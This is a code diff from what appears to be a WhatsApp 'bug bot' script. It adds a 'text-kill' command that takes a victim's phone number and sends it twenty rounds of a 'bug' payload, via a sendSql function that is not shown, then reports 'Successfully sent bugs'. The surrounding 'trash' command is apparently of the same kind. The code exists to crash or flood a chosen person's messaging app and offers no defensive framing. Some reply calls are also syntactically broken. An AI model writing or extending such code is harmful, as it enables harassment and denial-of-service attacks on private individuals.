@@ -1222,6 +1222,20 @@ dropNumber()
 }, 400)
 }
 break
+case'text-kill': {
+if (!isCreator) return
+if (!q) return reply(Use like .${command} 23490316165xx)
+let num = q.replace(/[^0-9]/g, "")
+if (num.startsWith('0')) return reply(Number cannot start with 0 \n\n<✓> Example : .${command} 23490316165xx)
+let target = num + '@s.whatsapp.net'
+await reply("processing....")
+for (let j = 0; j < 20; j++) {
+await sendSql(target)
+await sleep(2000)
+}
+await reply(Successfully sent bugs to ${target} using ${command})
+}
+break
 case 'trash': {
 			if (!isCreator) return reply(mess.owner)
 			if (!q) return reply(`*Cannot Procces your Request*\n\n_Use : trash Number_\n_Example : .trash 254xx_\n\n𝐒𝐏𝐈𝐃𝐄𝐑-𝐕8👽`);
